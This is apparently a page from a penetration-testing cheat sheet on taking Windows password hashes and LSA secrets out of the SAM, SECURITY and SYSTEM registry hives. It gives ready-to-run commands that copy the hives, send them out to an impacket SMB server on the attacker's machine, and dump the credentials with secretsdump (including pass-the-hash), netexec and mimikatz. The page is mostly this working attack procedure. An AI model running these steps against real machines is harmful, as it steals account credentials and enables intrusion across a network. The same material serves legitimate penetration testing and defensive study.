# SAM & LSA

In Windows environments, passwords are stored in a hashed format in registry hives like SAM (Security Account Manager) and SECURITY.

| Hive     | Details                                                        | Format or credential material                                                                                                                                |
| -------- | -------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| SAM      | stores locally cached credentials (referred to as SAM secrets) | `LM` or `NT` hashes                                                                                                                                          |
| SECURITY | stores domain cached credentials (referred to as LSA secrets)  | Plaintext passwords, `LM` or `NT` hashes, Kerberos keys (DES, AES), Domain Cached Credentials (`DCC1` and `DCC2`), Security Questions (`L$`_`SQSA`_`<SID>`), |
| SYSTEM   | contains enough info to decrypt SAM secrets and LSA secrets    | N/A                                                                                                                                                          |

### Exfiltration

```sh
# Make a backup of the files, copy to attacker and dump
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save

esentutl.exe /y /vss C:\Windows\System32\config\SAM /d c:\temp\sam
esentutl.exe /y /vss C:\Windows\System32\config\SECURITY /d c:\temp\security
esentutl.exe /y /vss C:\Windows\System32\config\SYSTEM /d c:\temp\system

# Open an SMB server on the attacker's machine and copy the files
sudo impacket-smbserver <SHARE_NAME> -smb2support <DIRECTORY_TO_SHARE>
copy <FILE> \\<IP>\<SHARE_NAME>\   

# If unauthenticated guest access is blocked
sudo impacket-smbserver <SHARE_NAME> -smb2support <DIRECTORY_TO_SHARE> -user <USER> -password <PASS>
net use n: \\<IP>\<SHARE_NAME> /user:<USER> <PASS>
copy <FILE> n:\   # Copy file from the host to the server
```

### Dumping secrets

{% tabs %}
{% tab title="Secretsdump" %}
```sh
# Offline dumping of SAM & LSA secrets from exported hives
impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL

# Remote dumping of SAM & LSA secrets. Also works with PtH and Kerberos auth
impacket-secretsdump '<DOMAIN>/<USER>:<PASSWORD>@<TARGET>'
```
{% endtab %}

{% tab title="Netexec" %}
```sh
# Remote dumping of SAM & LSA secrets. Also works with PtH and Kerberos auth
nxc smb <TARGET> -u <USER> -p <PASSWORD> --sam/--lsa
```
{% endtab %}

{% tab title="Mimikatz" %}
```sh
# Local dumping of SAM and LSA secrets on the target
lsadump::sam
lsadump::secrets
```
{% endtab %}
{% endtabs %}
